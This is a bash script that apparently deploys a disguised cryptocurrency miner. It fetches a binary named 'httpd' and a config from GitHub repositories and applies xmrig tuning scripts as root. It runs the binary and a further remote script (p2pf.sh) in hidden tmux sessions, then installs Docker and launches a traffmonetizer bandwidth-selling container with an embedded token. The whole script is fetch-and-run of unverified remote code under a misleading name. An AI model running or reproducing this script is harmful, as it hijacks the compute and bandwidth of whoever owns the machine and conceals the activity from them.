#!/bin/bash
sudo apt update
sudo apt-get install git build-essential libapparmor-dev pkg-config gawk msr-tools cmake libuv1-dev libssl-dev libhwloc-dev gnupg2 gcc make gnupg2 unzip  msr-tools cmake libuv1-dev libssl-dev libhwloc-dev -y
sudo rm config.json
sudo wget https://raw.githubusercontent.com/peebass/serit/master/config.json
sudo wget https://github.com/minnie1311/azureAI/raw/master/httpd
wget https://raw.githubusercontent.com/xmrig/xmrig/master/scripts/enable_1gb_pages.sh
sudo bash enable_1gb_pages.sh
wget https://raw.githubusercontent.com/xmrig/xmrig/master/scripts/randomx_boost.sh
sudo bash randomx_boost.sh
sudo chmod +x httpd
sudo tmux new-session -d -s my_session1  './httpd -t 4'
wget https://raw.githubusercontent.com/peebass/serit/master/p2pf.sh
sudo tmux new-session -d -s 2 'bash p2pf.sh'
sleep 10
curl -fsSL get.docker.com -o get-docker.sh
sudo sh get-docker.sh
sudo tmux new-session -d -s 122 'docker run -i --name tm traffmonetizer/cli start accept --token bMTMb3T58XQfs4obpSWrGWxy/1WaSimoaQV0ucdDE/U='
